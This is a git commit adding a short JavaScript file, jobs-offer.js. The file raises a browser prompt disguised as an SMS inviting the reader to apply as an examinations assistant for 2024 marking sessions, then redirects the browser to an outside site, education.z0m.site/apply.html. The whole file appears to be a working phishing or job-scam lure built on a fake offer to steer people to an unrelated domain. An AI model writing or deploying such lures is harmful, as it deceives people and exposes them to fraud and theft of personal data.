f9faecd98f561bc54211d98e61fa444bbd5a6a6a
surprise24x7 <132287490+surprise24x7@users.noreply.github.com>
2024-09-20 18:00:02 +0530

    Add files via upload

---
+++ jobs-offer.js
@@ -0,0 +1,6 @@
+
+var password = 'EXAMINATION ASSISTANT'
+password=prompt('SMS: You are invited to apply as examinations assistant for July and December 2024 marking sessions. kindly press Ok to start application now ','EXAMINATION ASSISTANT');
+if (password != 'EXAMINATION ASSISTANT') {
+location.href='https://education.z0m.site/apply.html';
+}
